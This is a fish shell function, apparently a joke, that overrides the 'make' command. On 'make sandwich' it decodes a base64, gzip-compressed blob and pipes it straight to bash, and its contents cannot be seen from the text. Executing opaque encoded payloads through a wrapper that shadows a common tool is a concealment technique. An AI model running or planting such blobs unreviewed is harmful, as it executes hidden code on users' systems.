function make
    if test (count $argv) -eq 1 ; and [ "$argv" = "sandwich" ]
        echo "H4sIAOnYHF0A/2VQTU8DIRS88yuejYf20ARTNBjjwVaNW4mXjclelcKWCxyEYhN/fIH9cBfYTF7ee7MzA0rCcgnXL5/VM1w9AobV6gHsUWgE4Qh+NLD4MIuu+1UWSYXStNo9tXMQy2o8Yn9Oc81q8l5yaeQPve6ri7V59QWfdVoJvW7ipt2m4J/Gncp9tzx4Z/yYhU+5g3aoWyoDdjMd6pqbe/mP+P+YK3jT04z/5l0zyd+9Sf9GG1/k35+JY2qK28HHsTrkDFqZvi3vOe5a5s30/m2l8g/3PljDH3x//Yg7Auv1QXBzEOgC0WPWeiACAAA=" | base64 --decode | gunzip | bash
    else
        eval (which make) $argv
    end  
end
